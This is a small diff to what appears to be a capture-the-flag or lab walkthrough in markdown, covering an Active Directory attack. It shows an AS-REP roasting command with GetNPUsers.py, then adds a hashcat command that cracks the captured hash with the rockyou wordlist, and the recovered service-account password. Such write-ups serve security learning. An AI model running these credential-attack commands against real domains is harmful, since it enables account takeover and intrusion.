@@ -38,5 +38,11 @@ GetNPUsers.py -dc-ip $IP -usersfile domain-users.txt -request -format hashcat -o
 ```
 - Got _TGT_ for _svc-alfresco_ service account
 
+```bash
+hashcat -m 18200 -a 0 asreprost.hashes /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt -O
+```
+- svc-alfresco:_s3rvice_
+
+
 
 
